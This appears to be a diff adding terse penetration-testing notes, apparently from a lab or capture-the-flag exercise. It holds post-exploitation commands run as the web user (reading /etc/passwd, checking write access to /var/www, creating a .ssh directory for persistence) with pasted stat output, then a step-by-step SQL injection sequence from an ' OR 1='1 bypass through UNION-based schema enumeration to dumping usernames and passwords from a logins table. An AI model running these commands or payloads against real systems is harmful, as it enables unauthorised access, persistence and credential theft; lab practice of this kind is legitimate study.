@@ -1,0 +1,41 @@
+whoami
+cat /etc/passwd | grep data    # --- our user has access to bash shell and its home dir is /var/www
+stat /var/www  #--- 775/drwxrwxr-x)  Uid: (    0/    root)   Gid: (   33/www-data) We can write to home dir
+netstat -anutp  # SSH is running!
+mkdir /var/www/.ssh # --- create ssh directory in our user home dir
+
+    File: /var/www
+  Size: 4096      	Blocks: 8          IO Block: 4096   directory
+Device: fc01h/64513d	Inode: 258839      Links: 3
+Access: (0775/drwxrwxr-x)  Uid: (    0/    root)   Gid: (   33/www-data)
+Access: 2022-07-08 14:34:10.645013341 +0000
+Modify: 2022-04-19 20:14:11.336000000 +0000
+Change: 2022-04-19 20:18:05.632000000 +0000
+ Birth: -
+ 
+ 
+ 
+ 
+ 
+ webx SQL
+ 
+ http:// GET
+ 
+ user field POST
+ 
+ 
+ step 1
+Test both GET and POST
+' OR 1='1
+
+step 2
+identify columns
+union select 1,2,3;#
+
+step 3
+golden statement
+union select column_name, table_name, table_schema from information_schema.columns;#
+
+step 4
+dump relevant databases
+union select user, pass, 3 from userinfo.logins;#
